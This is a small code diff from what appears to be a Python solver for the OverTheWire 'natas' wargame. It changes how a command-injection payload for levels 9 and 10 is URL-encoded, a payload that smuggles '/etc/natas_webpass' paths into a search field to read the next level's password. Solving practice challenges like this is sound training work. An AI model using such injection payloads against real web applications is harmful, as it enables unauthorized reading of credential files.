@@ -254,7 +254,10 @@ while True:
             else:
                 print(" Secret not found")
         elif level == 9 or level == 10:
-            u = "/?needle=\"\"+%2Fetc%2Fnatas_webpass%2Fnatas{}+%23&submit=Search".format(level + 1)
+            u = "/?needle={}&submit=Search".format(
+                urllib.parse.quote("\"\" /etc/natas_webpass/natas{} #".format(level + 1))
+            )
+
             print(" Get page {}".format(u))
             res, reg = rex(
                 "GET",
